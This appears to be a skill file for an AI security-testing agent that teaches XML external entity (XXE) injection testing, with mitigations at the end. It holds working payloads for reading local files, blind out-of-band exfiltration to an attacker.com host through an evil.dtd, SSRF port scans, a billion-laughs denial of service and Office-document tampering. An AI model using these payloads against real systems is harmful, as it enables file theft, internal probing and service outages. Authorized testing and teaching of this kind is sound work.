---
name: xxe-testing
description: Professional skills and methodology for XML external entity (XXE) injection testing
version: 1.0.0
---

# XML External Entity (XXE) Injection Testing

## Overview

XML External Entity (XXE) injection exploits an XML parser's handling of external entities. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

When processing external entities, an XML parser may read local files, perform SSRF, or cause denial of service. Common contexts include:
- XML document parsing
- SOAP services
- Office documents (.docx, .xlsx, etc.)
- SVG images
- PDF files

## Testing Methods

### 1. Identify XML Input Points

- File upload features
- APIs accepting XML data
- SOAP requests
- Office document processing
- Data import features

### 2. Basic XXE Detection

**Test external entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Test network requests (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE Detection

**When the response does not show content directly:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Using parameter entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**Contents of evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## Exploitation Techniques

### File Reading

**Read local files:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Windows paths:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### SSRF Attacks

**Internal network discovery:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Port scanning:**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### Denial of Service

**Billion Laughs attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

### XXE in Office Documents

**docx file structure:**
```
word/document.xml - Document content
word/_rels/document.xml.rels - External references
```

**Modify document.xml.rels:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## Bypass Techniques

### Different Protocols

**PHP：**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java：**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**Encoding bypass:**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### Parameter Entities

**Use parameter entities to bypass certain restrictions:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## Tools

### XXEinjector

```bash
# Basic usage
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# Read files
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. Intercept a request containing XML
2. Send to Repeater
3. Modify the XML and add external entities
4. Observe the response or out-of-band data

## Verification and Reporting

### Verification Steps

1. Confirm that the XML parser processes external entities
2. Verify successful file reading or SSRF
3. Assess impact (sensitive files, internal access, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and XML input points
- Readable files or accessible internal resources
- Complete exploitation steps and PoC
- Remediation guidance (disable external entities, use allowlists, etc.)

## Mitigations

### Recommended Approach

1. **Disable external entities**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Use allowlist validation**
   - Validate XML structure
   - Restrict allowed entities

3. **Use secure parsers**
   - Use parsers that do not process DTDs
   - Use JSON instead of XML

## Considerations

- Test only in authorized environments
- Avoid disclosing data by reading sensitive files
- Account for XXE handling differences between languages and libraries
- Pay attention to file formats when testing Office documents